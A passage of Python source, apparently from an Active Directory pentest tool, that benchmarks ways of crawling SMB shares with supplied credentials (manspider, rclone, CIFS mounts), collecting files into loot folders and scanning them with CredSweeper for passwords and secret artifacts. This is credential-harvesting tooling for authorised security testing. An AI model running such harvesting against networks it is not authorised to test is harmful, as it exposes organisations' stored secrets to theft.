    if not getattr(shell, "manspider_path", None):
        print_warning("manspider is not configured. Skipping legacy benchmark.")
        return {"success": False}
    if not getattr(shell, "credsweeper_path", None):
        print_warning("CredSweeper is not configured. Skipping legacy benchmark.")
        return {"success": False}

    workspace_cwd = shell._get_workspace_cwd()
    benchmark_root_abs = domain_path(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "sensitive_benchmark",
        "manspider",
    )
    os.makedirs(benchmark_root_abs, exist_ok=True)
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    log_file = os.path.join(
        benchmark_root_abs,
        f"spidering_passw_{timestamp}_{_slugify_token(username)}.log",
    )
    loot_dir = os.path.join(
        benchmark_root_abs,
        f"loot_{timestamp}_{_slugify_token(username)}",
    )
    os.makedirs(loot_dir, exist_ok=True)
    command = _build_manspider_passw_command(
        shell,
        domain=domain,
        username=username,
        password=password,
        hosts=hosts,
        loot_dir=loot_dir,
        benchmark_profile=benchmark_profile,
    )
    print_info_debug(f"Legacy manspider benchmark command: {command}")
    prepare_started = time.perf_counter()
    completed_process = shell.run_command(command)
    prepare_seconds = max(0.0, time.perf_counter() - prepare_started)
    if completed_process is None:
        return {"success": False}

    stdout_text = str(getattr(completed_process, "stdout", "") or "")
    output_lines = 0
    if stdout_text:
        with open(log_file, "w", encoding="utf-8") as handle:
            for line in stdout_text.splitlines():
                clean_line = strip_ansi_codes(line.strip())
                if not clean_line:
                    continue
                handle.write(clean_line + "\n")
                output_lines += 1

    service = shell._get_credsweeper_service()
    artifacts_dir = _resolve_credsweeper_artifacts_dir(
        shell=shell,
        domain=domain,
        purpose="sensitive_benchmark_manspider",
    )
    analysis_started = time.perf_counter()
    findings = _run_credsweeper_benchmark_path_scan(
        credsweeper_service=service,
        credsweeper_path=shell.credsweeper_path,
        path_to_scan=loot_dir,
        json_output_dir=artifacts_dir,
        benchmark_scope=benchmark_scope,
        jobs=get_default_credsweeper_jobs(),
        find_by_ext=False,
    )
    analysis_seconds = max(0.0, time.perf_counter() - analysis_started)
    downloaded_files = _count_files_under_path(loot_dir)
    total_findings, files_with_findings = _count_grouped_credential_findings(findings)
    credential_preview_values = _build_grouped_credential_preview(findings)
    timing_key_prefix = (
        "document"
        if benchmark_scope == SMB_SENSITIVE_BENCHMARK_SCOPE_BINARY_ONLY
        else "text"
    )
    return {
        "success": bool(getattr(completed_process, "returncode", 1) == 0),
        "candidate_files": int(downloaded_files),
        "scanned_files": int(downloaded_files),
        "files_with_findings": int(files_with_findings),
        "credential_like_findings": int(total_findings),
        "mapped_shares": int(len(shares)),
        f"{timing_key_prefix}_prepare_seconds": prepare_seconds,
        f"{timing_key_prefix}_analysis_seconds": analysis_seconds,
        "credential_preview_values": credential_preview_values,
    }


def _run_manspider_artifact_benchmark(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    hosts: list[str],
    username: str,
    password: str,
) -> dict[str, Any]:
    """Run non-interactive manspider artifact benchmark."""
    if not getattr(shell, "manspider_path", None):
        print_warning("manspider is not configured. Skipping artifact benchmark.")
        return {"success": False}

    workspace_cwd = shell._get_workspace_cwd()
    benchmark_root_abs = domain_path(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "sensitive_benchmark",
        "manspider_artifacts",
    )
    os.makedirs(benchmark_root_abs, exist_ok=True)
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    loot_dir = os.path.join(
        benchmark_root_abs,
        f"loot_{timestamp}_{_slugify_token(username)}",
    )
    os.makedirs(loot_dir, exist_ok=True)
    artifact_extensions = tuple(
        dict.fromkeys(
            get_manspider_phase_extensions("direct_secret_artifacts")
            + get_manspider_phase_extensions("heavy_artifacts")
        )
    )
    command = _build_manspider_extensions_command(
        shell=shell,
        domain=domain,
        username=username,
        password=password,
        hosts=hosts,
        loot_dir=loot_dir,
        extensions=artifact_extensions,
    )
    print_info_debug(f"Legacy manspider artifact benchmark command: {command}")
    prepare_started = time.perf_counter()
    completed_process = shell.run_command(command)
    prepare_seconds = max(0.0, time.perf_counter() - prepare_started)
    if completed_process is None:
        return {"success": False}

    artifact_files = _list_files_under_path(loot_dir)
    spidering_service = shell._get_spidering_service()
    artifact_tuning = choose_artifact_processing_tuning(file_count=len(artifact_files))
    print_info_debug(
        "Artifact benchmark tuning: "
        f"backend=manspider files={len(artifact_files)} workers={artifact_tuning.workers}"
    )
    analysis_started = time.perf_counter()
    spidering_service.process_found_files_batch(
        artifact_files,
        domain,
        "ext",
        source_hosts=hosts,
        source_shares=shares,
        auth_username=username,
        enable_legacy_zip_callbacks=False,
        apply_actions=False,
        max_workers=artifact_tuning.workers,
    )
    analysis_seconds = max(0.0, time.perf_counter() - analysis_started)
    return {
        "success": bool(getattr(completed_process, "returncode", 1) == 0),
        "candidate_files": len(artifact_files),
        "processed_files": len(artifact_files),
        "artifact_hits": len(artifact_files),
        "mapped_shares": int(len(shares)),
        "artifact_prepare_seconds": prepare_seconds,
        "artifact_analysis_seconds": analysis_seconds,
        "artifact_preview_values": _build_artifact_preview_values(artifact_files),
    }


def _run_rclone_credsweeper_benchmark(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    hosts: list[str],
    username: str,
    password: str,
    share_map: dict[str, dict[str, str]] | None,
    benchmark_profile: str = DEFAULT_SMB_SENSITIVE_FILE_PROFILE,
    benchmark_scope: str = SMB_SENSITIVE_BENCHMARK_SCOPE_TEXT_ONLY,
    benchmark_execution_mode: str = "single_phase",
) -> dict[str, Any]:
    """Run rclone download + CredSweeper benchmark over one local loot tree."""
    if (
        benchmark_scope == SMB_SENSITIVE_BENCHMARK_SCOPE_ALL_SUPPORTED
        and benchmark_execution_mode == "production_sequenced"
    ):
        return _merge_credential_benchmark_results(
            [
                _run_timed_benchmark_phase(
                    phase_seconds_key="text_phase_seconds",
                    runner=lambda: _run_rclone_credsweeper_benchmark(
                        shell=shell,
                        domain=domain,
                        shares=shares,
                        hosts=hosts,
                        username=username,
                        password=password,
                        share_map=share_map,
                        benchmark_profile=SMB_SENSITIVE_FILE_PROFILE_TEXT_ONLY,
                        benchmark_scope=SMB_SENSITIVE_BENCHMARK_SCOPE_TEXT_ONLY,
                        benchmark_execution_mode="single_phase",
                    ),
                ),
                _run_timed_benchmark_phase(
                    phase_seconds_key="document_phase_seconds",
                    runner=lambda: _run_rclone_credsweeper_benchmark(
                        shell=shell,
                        domain=domain,
                        shares=shares,
                        hosts=hosts,
                        username=username,
                        password=password,
                        share_map=share_map,
                        benchmark_profile=SMB_SENSITIVE_FILE_PROFILE_DOCUMENTS_ONLY,
                        benchmark_scope=SMB_SENSITIVE_BENCHMARK_SCOPE_BINARY_ONLY,
                        benchmark_execution_mode="single_phase",
                    ),
                ),
            ]
        )
    if not getattr(shell, "credsweeper_path", None):
        print_warning("CredSweeper is not configured. Skipping rclone benchmark.")
        return {"success": False}

    workspace_cwd = shell._get_workspace_cwd()
    benchmark_root_abs = domain_path(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "sensitive_benchmark",
        "rclone",
    )
    os.makedirs(benchmark_root_abs, exist_ok=True)
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    loot_dir = os.path.join(
        benchmark_root_abs,
        f"loot_{timestamp}_{_slugify_token(username)}",
    )
    os.makedirs(loot_dir, exist_ok=True)
    target_pairs = _resolve_cifs_host_share_targets(
        hosts=hosts,
        shares=shares,
        share_map=share_map,
    )
    prepare_started = time.perf_counter()
    download_result = _run_rclone_copy_loot_download(
        shell=shell,
        domain=domain,
        username=username,
        password=password,
        target_pairs=target_pairs,
        loot_dir=loot_dir,
        extensions=get_sensitive_file_extensions(benchmark_profile),
        mostly_small_files=True,
    )
    prepare_seconds = max(0.0, time.perf_counter() - prepare_started)
    if not bool(download_result.get("success")):
        return {"success": False}

    service = shell._get_credsweeper_service()
    artifacts_dir = _resolve_credsweeper_artifacts_dir(
        shell=shell,
        domain=domain,
        purpose="sensitive_benchmark_rclone",
    )
    analysis_started = time.perf_counter()
    findings = _run_credsweeper_benchmark_path_scan(
        credsweeper_service=service,
        credsweeper_path=shell.credsweeper_path,
        path_to_scan=loot_dir,
        json_output_dir=artifacts_dir,
        benchmark_scope=benchmark_scope,
        jobs=get_default_credsweeper_jobs(),
        find_by_ext=False,
    )
    analysis_seconds = max(0.0, time.perf_counter() - analysis_started)
    downloaded_files = _count_files_under_path(loot_dir)
    total_findings, files_with_findings = _count_grouped_credential_findings(findings)
    timing_key_prefix = (
        "document"
        if benchmark_scope == SMB_SENSITIVE_BENCHMARK_SCOPE_BINARY_ONLY
        else "text"
    )
    return {
        "success": True,
        "candidate_files": int(downloaded_files),
        "scanned_files": int(downloaded_files),
        "files_with_findings": int(files_with_findings),
        "credential_like_findings": int(total_findings),
        "mapped_shares": int(len(shares)),
        f"{timing_key_prefix}_prepare_seconds": prepare_seconds,
        f"{timing_key_prefix}_analysis_seconds": analysis_seconds,
        "credential_preview_values": _build_grouped_credential_preview(findings),
    }


def _run_rclone_mapped_credsweeper_benchmark(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    hosts: list[str],
    username: str,
    password: str,
    share_map: dict[str, dict[str, str]] | None,
    benchmark_profile: str = DEFAULT_SMB_SENSITIVE_FILE_PROFILE,
    benchmark_scope: str = SMB_SENSITIVE_BENCHMARK_SCOPE_TEXT_ONLY,
    benchmark_execution_mode: str = "single_phase",
    aggregate_map_path: str | None = None,
) -> dict[str, Any]:
    """Run mapping-first rclone benchmark using exact files-from downloads."""
    if (
        benchmark_scope == SMB_SENSITIVE_BENCHMARK_SCOPE_ALL_SUPPORTED
        and benchmark_execution_mode == "production_sequenced"
    ):
        generated_map_path = aggregate_map_path
        if not generated_map_path:
            generated_map_path, mapping_result = _generate_rclone_benchmark_mapping(
                shell=shell,
                domain=domain,
                username=username,
                password=password,
                hosts=hosts,
                shares=shares,
                share_map=share_map,
                purpose="rclone_mapped",
            )
            if not generated_map_path or not bool(mapping_result.get("success")):
                return {"success": False}
        return _merge_credential_benchmark_results(
            [
                _run_timed_benchmark_phase(
                    phase_seconds_key="text_phase_seconds",
                    runner=lambda: _run_rclone_mapped_credsweeper_benchmark(
                        shell=shell,
                        domain=domain,
                        shares=shares,
                        hosts=hosts,
                        username=username,
                        password=password,
                        share_map=share_map,
                        benchmark_profile=SMB_SENSITIVE_FILE_PROFILE_TEXT_ONLY,
                        benchmark_scope=SMB_SENSITIVE_BENCHMARK_SCOPE_TEXT_ONLY,
                        benchmark_execution_mode="single_phase",
                        aggregate_map_path=generated_map_path,
                    ),
                ),
                _run_timed_benchmark_phase(
                    phase_seconds_key="document_phase_seconds",
                    runner=lambda: _run_rclone_mapped_credsweeper_benchmark(
                        shell=shell,
                        domain=domain,
                        shares=shares,
                        hosts=hosts,
                        username=username,
                        password=password,
                        share_map=share_map,
                        benchmark_profile=SMB_SENSITIVE_FILE_PROFILE_DOCUMENTS_ONLY,
                        benchmark_scope=SMB_SENSITIVE_BENCHMARK_SCOPE_BINARY_ONLY,
                        benchmark_execution_mode="single_phase",
                        aggregate_map_path=generated_map_path,
                    ),
                ),
            ]
        )
    if not getattr(shell, "credsweeper_path", None):
        print_warning("CredSweeper is not configured. Skipping mapped rclone benchmark.")
        return {"success": False}

    benchmark_root_abs = _resolve_rclone_benchmark_root(
        shell=shell,
        domain=domain,
        purpose="rclone_mapped",
    )
    os.makedirs(benchmark_root_abs, exist_ok=True)
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    loot_dir = os.path.join(
        benchmark_root_abs,
        f"loot_{timestamp}_{_slugify_token(username)}",
    )
    manifest_dir = os.path.join(
        benchmark_root_abs,
        f"manifests_{timestamp}_{_slugify_token(username)}",
    )
    os.makedirs(loot_dir, exist_ok=True)
    os.makedirs(manifest_dir, exist_ok=True)

    effective_aggregate_map_path = aggregate_map_path
    if not effective_aggregate_map_path:
        effective_aggregate_map_path, mapping_result = _generate_rclone_benchmark_mapping(
            shell=shell,
            domain=domain,
            username=username,
            password=password,
            hosts=hosts,
            shares=shares,
            share_map=share_map,
            purpose="rclone_mapped",
        )
        if not effective_aggregate_map_path or not bool(mapping_result.get("success")):
            return {"success": False}

    from adscan_internal.services.share_mapping_service import ShareMappingService

    share_mapping_service = ShareMappingService()
    grouped_remote_paths = share_mapping_service.resolve_candidate_remote_paths_from_aggregate(
        aggregate_map_path=effective_aggregate_map_path,
        hosts=hosts,
        shares=shares,
        extensions=get_sensitive_file_extensions(benchmark_profile),
    )
    prepare_started = time.perf_counter()
    download_result = _run_rclone_copy_mapped_loot_download(
        shell=shell,
        domain=domain,
        username=username,
        password=password,
        grouped_remote_paths=grouped_remote_paths,
        loot_dir=loot_dir,
        manifest_dir=manifest_dir,
        mostly_small_files=True,
    )
    prepare_seconds = max(0.0, time.perf_counter() - prepare_started)
    if not bool(download_result.get("success")):
        return {"success": False}

    service = shell._get_credsweeper_service()
    artifacts_dir = _resolve_credsweeper_artifacts_dir(
        shell=shell,
        domain=domain,
        purpose="sensitive_benchmark_rclone_mapped",
    )
    analysis_started = time.perf_counter()
    findings = _run_credsweeper_benchmark_path_scan(
        credsweeper_service=service,
        credsweeper_path=shell.credsweeper_path,
        path_to_scan=loot_dir,
        json_output_dir=artifacts_dir,
        benchmark_scope=benchmark_scope,
        jobs=get_default_credsweeper_jobs(),
        find_by_ext=False,
    )
    analysis_seconds = max(0.0, time.perf_counter() - analysis_started)
    downloaded_files = _count_files_under_path(loot_dir)
    total_findings, files_with_findings = _count_grouped_credential_findings(findings)
    timing_key_prefix = (
        "document"
        if benchmark_scope == SMB_SENSITIVE_BENCHMARK_SCOPE_BINARY_ONLY
        else "text"
    )
    return {
        "success": True,
        "candidate_files": int(downloaded_files),
        "scanned_files": int(downloaded_files),
        "files_with_findings": int(files_with_findings),
        "credential_like_findings": int(total_findings),
        "mapped_shares": int(len(grouped_remote_paths)),
        f"{timing_key_prefix}_prepare_seconds": prepare_seconds,
        f"{timing_key_prefix}_analysis_seconds": analysis_seconds,
        "credential_preview_values": _build_grouped_credential_preview(findings),
    }


def _run_rclone_cat_credsweeper_library_benchmark(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    hosts: list[str],
    username: str,
    password: str,
    share_map: dict[str, dict[str, str]] | None,
    benchmark_profile: str = DEFAULT_SMB_SENSITIVE_FILE_PROFILE,
    benchmark_scope: str = SMB_SENSITIVE_BENCHMARK_SCOPE_TEXT_ONLY,
    benchmark_execution_mode: str = "single_phase",
    aggregate_map_path: str | None = None,
) -> dict[str, Any]:
    """Run mapping-first rclone cat benchmark with in-memory CredSweeper library scan."""
    if (
        benchmark_scope == SMB_SENSITIVE_BENCHMARK_SCOPE_ALL_SUPPORTED
        and benchmark_execution_mode == "production_sequenced"
    ):
        generated_map_path = aggregate_map_path
        if not generated_map_path:
            generated_map_path, mapping_result = _generate_rclone_benchmark_mapping(
                shell=shell,
                domain=domain,
                username=username,
                password=password,
                hosts=hosts,
                shares=shares,
                share_map=share_map,
                purpose="rclone_library",
            )
            if not generated_map_path or not bool(mapping_result.get("success")):
                return {"success": False}
        return _merge_credential_benchmark_results(
            [
                _run_timed_benchmark_phase(
                    phase_seconds_key="text_phase_seconds",
                    runner=lambda: _run_rclone_cat_credsweeper_library_benchmark(
                        shell=shell,
                        domain=domain,
                        shares=shares,
                        hosts=hosts,
                        username=username,
                        password=password,
                        share_map=share_map,
                        benchmark_profile=SMB_SENSITIVE_FILE_PROFILE_TEXT_ONLY,
                        benchmark_scope=SMB_SENSITIVE_BENCHMARK_SCOPE_TEXT_ONLY,
                        benchmark_execution_mode="single_phase",
                        aggregate_map_path=generated_map_path,
                    ),
                ),
                _run_timed_benchmark_phase(
                    phase_seconds_key="document_phase_seconds",
                    runner=lambda: _run_rclone_cat_credsweeper_library_benchmark(
                        shell=shell,
                        domain=domain,
                        shares=shares,
                        hosts=hosts,
                        username=username,
                        password=password,
                        share_map=share_map,
                        benchmark_profile=SMB_SENSITIVE_FILE_PROFILE_DOCUMENTS_ONLY,
                        benchmark_scope=SMB_SENSITIVE_BENCHMARK_SCOPE_BINARY_ONLY,
                        benchmark_execution_mode="single_phase",
                        aggregate_map_path=generated_map_path,
                    ),
                ),
            ]
        )

    from adscan_internal.services.credsweeper_library_service import (
        CredSweeperLibraryService,
        InMemoryCredSweeperTarget,
    )
    from adscan_internal.services.share_mapping_service import ShareMappingService

    effective_aggregate_map_path = aggregate_map_path
    if not effective_aggregate_map_path:
        effective_aggregate_map_path, mapping_result = _generate_rclone_benchmark_mapping(
            shell=shell,
            domain=domain,
            username=username,
            password=password,
            hosts=hosts,
            shares=shares,
            share_map=share_map,
            purpose="rclone_library",
        )
        if not effective_aggregate_map_path or not bool(mapping_result.get("success")):
            return {"success": False}

    share_mapping_service = ShareMappingService()
    grouped_remote_paths = share_mapping_service.resolve_candidate_remote_paths_from_aggregate(
        aggregate_map_path=effective_aggregate_map_path,
        hosts=hosts,
        shares=shares,
        extensions=get_sensitive_file_extensions(benchmark_profile),
    )
    file_count = sum(len(paths) for paths in grouped_remote_paths.values())
    cat_tuning = choose_rclone_cat_tuning(
        file_count=file_count,
        share_count=len(grouped_remote_paths),
        mostly_small_files=_is_rclone_small_file_profile(benchmark_profile),
    )
    print_info_debug(
        "rclone library benchmark tuning: "
        f"files={file_count} shares={len(grouped_remote_paths)} "
        f"fetch_workers={cat_tuning.fetch_workers} "
        f"analysis_jobs={cat_tuning.analysis_jobs}"
    )
    prepare_started = time.perf_counter()
    fetched_payloads = _run_rclone_cat_library_fetch(
        shell=shell,
        domain=domain,
        username=username,
        password=password,
        grouped_remote_paths=grouped_remote_paths,
        tuning=cat_tuning,
    )
    prepare_seconds = max(0.0, time.perf_counter() - prepare_started)
    if not fetched_payloads:
        return {"success": False}

    targets = [
        InMemoryCredSweeperTarget(
            content=entry["content"],
            file_path=entry["file_path"],
            file_type=entry["file_type"],
            info=entry["info"],
        )
        for entry in fetched_payloads
    ]
    library_service = CredSweeperLibraryService()
    analysis_started = time.perf_counter()
    findings = _run_credsweeper_library_benchmark_target_scan(
        library_service=library_service,
        targets=targets,
        benchmark_scope=benchmark_scope,
        jobs=cat_tuning.analysis_jobs,
    )
    analysis_seconds = max(0.0, time.perf_counter() - analysis_started)
    total_findings, files_with_findings = _count_grouped_credential_findings(findings)
    timing_key_prefix = (
        "document"
        if benchmark_scope == SMB_SENSITIVE_BENCHMARK_SCOPE_BINARY_ONLY
        else "text"
    )
    return {
        "success": True,
        "candidate_files": len(targets),
        "scanned_files": len(targets),
        "files_with_findings": int(files_with_findings),
        "credential_like_findings": int(total_findings),
        "mapped_shares": int(len(grouped_remote_paths)),
        f"{timing_key_prefix}_prepare_seconds": prepare_seconds,
        f"{timing_key_prefix}_analysis_seconds": analysis_seconds,
        "credential_preview_values": _build_grouped_credential_preview(findings),
    }


def _run_rclone_artifact_benchmark(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    hosts: list[str],
    username: str,
    password: str,
    share_map: dict[str, dict[str, str]] | None,
) -> dict[str, Any]:
    """Run rclone-backed specialized artifact benchmark over downloaded loot."""
    workspace_cwd = shell._get_workspace_cwd()
    benchmark_root_abs = domain_path(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "sensitive_benchmark",
        "rclone_artifacts",
    )
    os.makedirs(benchmark_root_abs, exist_ok=True)
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    loot_dir = os.path.join(
        benchmark_root_abs,
        f"loot_{timestamp}_{_slugify_token(username)}",
    )
    os.makedirs(loot_dir, exist_ok=True)
    target_pairs = _resolve_cifs_host_share_targets(
        hosts=hosts,
        shares=shares,
        share_map=share_map,
    )
    artifact_extensions = tuple(
        dict.fromkeys(
            get_sensitive_phase_extensions("direct_secret_artifacts")
            + get_sensitive_phase_extensions("heavy_artifacts")
        )
    )
    prepare_started = time.perf_counter()
    download_result = _run_rclone_copy_loot_download(
        shell=shell,
        domain=domain,
        username=username,
        password=password,
        target_pairs=target_pairs,
        loot_dir=loot_dir,
        extensions=artifact_extensions,
        mostly_small_files=False,
    )
    prepare_seconds = max(0.0, time.perf_counter() - prepare_started)
    if not bool(download_result.get("success")):
        return {"success": False}

    artifact_files = _list_files_under_path(loot_dir)
    spidering_service = shell._get_spidering_service()
    artifact_tuning = choose_artifact_processing_tuning(file_count=len(artifact_files))
    print_info_debug(
        "Artifact benchmark tuning: "
        f"backend=rclone_copy files={len(artifact_files)} workers={artifact_tuning.workers}"
    )
    analysis_started = time.perf_counter()
    spidering_service.process_found_files_batch(
        artifact_files,
        domain,
        "ext",
        source_hosts=hosts,
        source_shares=shares,
        auth_username=username,
        enable_legacy_zip_callbacks=False,
        apply_actions=False,
        max_workers=artifact_tuning.workers,
    )
    analysis_seconds = max(0.0, time.perf_counter() - analysis_started)
    return {
        "success": True,
        "candidate_files": len(artifact_files),
        "processed_files": len(artifact_files),
        "artifact_hits": len(artifact_files),
        "mapped_shares": int(len(shares)),
        "artifact_prepare_seconds": prepare_seconds,
        "artifact_analysis_seconds": analysis_seconds,
        "artifact_preview_values": _build_artifact_preview_values(artifact_files),
    }


def _run_rclone_mapped_artifact_benchmark(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    hosts: list[str],
    username: str,
    password: str,
    share_map: dict[str, dict[str, str]] | None,
    aggregate_map_path: str | None = None,
) -> dict[str, Any]:
    """Run mapping-first rclone artifact benchmark using exact files-from downloads."""
    benchmark_root_abs = _resolve_rclone_benchmark_root(
        shell=shell,
        domain=domain,
        purpose="rclone_mapped_artifacts",
    )
    os.makedirs(benchmark_root_abs, exist_ok=True)
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    loot_dir = os.path.join(
        benchmark_root_abs,
        f"loot_{timestamp}_{_slugify_token(username)}",
    )
    manifest_dir = os.path.join(
        benchmark_root_abs,
        f"manifests_{timestamp}_{_slugify_token(username)}",
    )
    os.makedirs(loot_dir, exist_ok=True)
    os.makedirs(manifest_dir, exist_ok=True)

    effective_aggregate_map_path = aggregate_map_path
    if not effective_aggregate_map_path:
        effective_aggregate_map_path, mapping_result = _generate_rclone_benchmark_mapping(
            shell=shell,
            domain=domain,
            username=username,
            password=password,
            hosts=hosts,
            shares=shares,
            share_map=share_map,
            purpose="rclone_mapped_artifacts",
        )
        if not effective_aggregate_map_path or not bool(mapping_result.get("success")):
            return {"success": False}

    from adscan_internal.services.share_mapping_service import ShareMappingService

    artifact_extensions = tuple(
        dict.fromkeys(
            get_sensitive_phase_extensions("direct_secret_artifacts")
            + get_sensitive_phase_extensions("heavy_artifacts")
        )
    )
    share_mapping_service = ShareMappingService()
    grouped_remote_paths = share_mapping_service.resolve_candidate_remote_paths_from_aggregate(
        aggregate_map_path=effective_aggregate_map_path,
        hosts=hosts,
        shares=shares,
        extensions=artifact_extensions,
    )
    prepare_started = time.perf_counter()
    download_result = _run_rclone_copy_mapped_loot_download(
        shell=shell,
        domain=domain,
        username=username,
        password=password,
        grouped_remote_paths=grouped_remote_paths,
        loot_dir=loot_dir,
        manifest_dir=manifest_dir,
        mostly_small_files=False,
    )
    prepare_seconds = max(0.0, time.perf_counter() - prepare_started)
    if not bool(download_result.get("success")):
        return {"success": False}

    artifact_files = _list_files_under_path(loot_dir)
    spidering_service = shell._get_spidering_service()
    artifact_tuning = choose_artifact_processing_tuning(file_count=len(artifact_files))
    print_info_debug(
        "Artifact benchmark tuning: "
        f"backend=rclone_mapped_copy files={len(artifact_files)} workers={artifact_tuning.workers}"
    )
    analysis_started = time.perf_counter()
    spidering_service.process_found_files_batch(
        artifact_files,
        domain,
        "ext",
        source_hosts=hosts,
        source_shares=shares,
        auth_username=username,
        enable_legacy_zip_callbacks=False,
        apply_actions=False,
        max_workers=artifact_tuning.workers,
    )
    analysis_seconds = max(0.0, time.perf_counter() - analysis_started)
    return {
        "success": True,
        "candidate_files": len(artifact_files),
        "processed_files": len(artifact_files),
        "artifact_hits": len(artifact_files),
        "mapped_shares": int(len(grouped_remote_paths)),
        "artifact_prepare_seconds": prepare_seconds,
        "artifact_analysis_seconds": analysis_seconds,
        "artifact_preview_values": _build_artifact_preview_values(artifact_files),
    }


def _run_cifs_credsweeper_benchmark(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    hosts: list[str],
    username: str,
    password: str,
    share_map: dict[str, dict[str, str]] | None,
    benchmark_profile: str = DEFAULT_SMB_SENSITIVE_FILE_PROFILE,
    benchmark_scope: str = SMB_SENSITIVE_BENCHMARK_SCOPE_TEXT_ONLY,
    benchmark_execution_mode: str = "single_phase",
    use_mapping: bool = True,
    aggregate_map_path: str | None = None,
) -> dict[str, Any]:
    """Run non-interactive CIFS + CredSweeper benchmark."""
    if (
        benchmark_scope == SMB_SENSITIVE_BENCHMARK_SCOPE_ALL_SUPPORTED
        and benchmark_execution_mode == "production_sequenced"
    ):
        return _merge_credential_benchmark_results(
            [
                _run_timed_benchmark_phase(
                    phase_seconds_key="text_phase_seconds",
                    runner=lambda: _run_cifs_credsweeper_benchmark(
                        shell=shell,
                        domain=domain,
                        shares=shares,
                        hosts=hosts,
                        username=username,
                        password=password,
                        share_map=share_map,
                        benchmark_profile=SMB_SENSITIVE_FILE_PROFILE_TEXT_ONLY,
                        benchmark_scope=SMB_SENSITIVE_BENCHMARK_SCOPE_TEXT_ONLY,
                        benchmark_execution_mode="single_phase",
                    ),
                ),
                _run_timed_benchmark_phase(
                    phase_seconds_key="document_phase_seconds",
                    runner=lambda: _run_cifs_credsweeper_benchmark(
                        shell=shell,
                        domain=domain,
                        shares=shares,
                        hosts=hosts,
                        username=username,
                        password=password,
                        share_map=share_map,
                        benchmark_profile=SMB_SENSITIVE_FILE_PROFILE_DOCUMENTS_ONLY,
                        benchmark_scope=SMB_SENSITIVE_BENCHMARK_SCOPE_BINARY_ONLY,
                        benchmark_execution_mode="single_phase",
                    ),
                ),
            ]
        )
    from adscan_internal.services.cifs_credsweeper_scan_service import (
        CIFSCredSweeperScanService,
    )
    from adscan_internal.services.credsweeper_service import CredSweeperService

    if not getattr(shell, "credsweeper_path", None):
        print_warning("CredSweeper is not configured. Skipping CIFS benchmark.")
        return {"success": False}

    effective_mount_root = _resolve_cifs_mount_root(shell=shell, domain=domain)
    aggregate_map_abs = (
        str(aggregate_map_path or "").strip()
        if use_mapping
        else ""
    ) or (
        _resolve_cifs_aggregate_map_path(shell=shell, domain=domain)
        if use_mapping
        else None
    )
    mount_targets = _resolve_cifs_host_share_targets(
        hosts=hosts,
        shares=shares,
        share_map=share_map,
    )
    mounted_points: list[str] = []
    try:
        mounted_points = _mount_cifs_targets_via_host_helper(
            domain=domain,
            username=username,
            password=password,
            mount_root=effective_mount_root,
            targets=mount_targets,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning_debug(
            f"CIFS sensitive benchmark mount error: {type(exc).__name__}: {exc}"
        )

    if not os.path.isdir(effective_mount_root):
        return {"success": False}

    credsweeper_service = (
        shell._get_credsweeper_service()
        if callable(getattr(shell, "_get_credsweeper_service", None))
        else CredSweeperService(shell.run_command)
    )
    scan_service = CIFSCredSweeperScanService()
    artifacts_dir = _resolve_credsweeper_artifacts_dir(
        shell=shell,
        domain=domain,
        purpose="sensitive_benchmark_cifs",
    )
    try:
        scan_result = scan_service.scan_mounted_shares(
            mount_root=effective_mount_root,
            hosts=hosts,
            shares=shares,
            credsweeper_service=credsweeper_service,
            credsweeper_path=shell.credsweeper_path,
            json_output_dir=artifacts_dir,
            profile=benchmark_profile,
            aggregate_map_path=aggregate_map_abs if use_mapping else None,
            document_depth=(
                benchmark_scope
                == SMB_SENSITIVE_BENCHMARK_SCOPE_DOCUMENTS_DEPTH_EXPERIMENTAL
            ),
        )
    finally:
        try:
            _unmount_cifs_targets_via_host_helper(mount_points=mounted_points)
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_warning_debug(
                f"CIFS sensitive benchmark unmount error: {type(exc).__name__}: {exc}"
            )

    return {
        "success": True,
        "candidate_files": int(scan_result.candidate_files),
        "scanned_files": int(scan_result.scanned_files),
        "files_with_findings": int(scan_result.files_with_findings),
        "credential_like_findings": int(scan_result.total_findings),
        "mapped_shares": int(scan_result.mapped_shares),
        (
            "document_prepare_seconds"
            if benchmark_scope == SMB_SENSITIVE_BENCHMARK_SCOPE_BINARY_ONLY
            else "text_prepare_seconds"
        ): float(scan_result.prepare_seconds),
        (
            "document_analysis_seconds"
            if benchmark_scope == SMB_SENSITIVE_BENCHMARK_SCOPE_BINARY_ONLY
            else "text_analysis_seconds"
        ): float(scan_result.analysis_seconds),
        "credential_preview_values": _build_grouped_credential_preview(
            scan_result.findings
        ),
    }


def _run_cifs_artifact_benchmark(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    hosts: list[str],
    username: str,
    password: str,
    share_map: dict[str, dict[str, str]] | None,
    use_mapping: bool = True,
    aggregate_map_path: str | None = None,
) -> dict[str, Any]:
    """Run non-interactive CIFS artifact benchmark using mounted files."""
    effective_mount_root = _resolve_cifs_mount_root(shell=shell, domain=domain)
    prepare_seconds = 0.0
    analysis_seconds = 0.0
    aggregate_map_abs = (
        str(aggregate_map_path or "").strip()
        if use_mapping
        else ""
    ) or (
        _resolve_cifs_aggregate_map_path(shell=shell, domain=domain)
        if use_mapping
        else None
    )
    mount_targets = _resolve_cifs_host_share_targets(
        hosts=hosts,
        shares=shares,
        share_map=share_map,
    )
    mounted_points: list[str] = []
    try:
        mounted_points = _mount_cifs_targets_via_host_helper(
            domain=domain,
            username=username,
            password=password,
